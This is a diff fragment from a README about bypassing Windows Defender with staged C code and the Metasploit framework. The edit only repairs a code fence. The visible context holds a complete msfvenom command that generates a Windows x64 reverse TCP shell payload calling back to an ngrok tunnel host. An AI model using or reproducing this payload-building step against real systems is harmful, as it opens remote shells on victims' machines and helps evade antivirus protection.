@@ -33,4 +33,4 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 - Create the .bin payload using msfvenom -
   ```
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
-  ``
+  ```
